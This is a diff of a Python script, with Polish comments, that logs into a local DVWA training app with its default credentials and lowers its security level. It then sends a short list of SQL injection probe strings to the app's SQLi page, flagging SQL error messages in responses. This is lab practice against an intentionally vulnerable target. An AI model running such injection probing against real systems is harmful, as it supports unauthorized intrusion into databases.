@@ -2,23 +2,26 @@ import requests
 
 s = requests.Session()
 
-login_data = {
+# login
+s.post("http://localhost/DVWA/login.php", data={
     "username": "admin",
     "password": "password",
     "Login": "Login"
-}
+})
 
-s.post("http://localhost/DVWA/login.php", data=login_data)
+# ustaw security LOW (mega ważne)
+s.get("http://localhost/DVWA/security.php?security=low&seclev_submit=Submit")
 
-s.get("http://localhost/DVWA/login.php")
+url = "http://localhost/DVWA/vulnerabilities/sqli/"
 
 payloads = ["1", "'", '"', "--", "'("]
 
 for payload in payloads:
-    r = requests.get(
-        "http://localhost/DVWA/vulnerabilities/sqli/",
-        params={"?id": payload}
-    )
 
-    print(payload, r.status_code)
-    print(r.text)
+    r = s.get(url, params={"id": payload})
+
+    print("\nPayload:", payload)
+    print("Status:", r.status_code)
+
+    if "sql" in r.text.lower() or "mysql" in r.text.lower():
+        print("[!] możliwy SQL error")
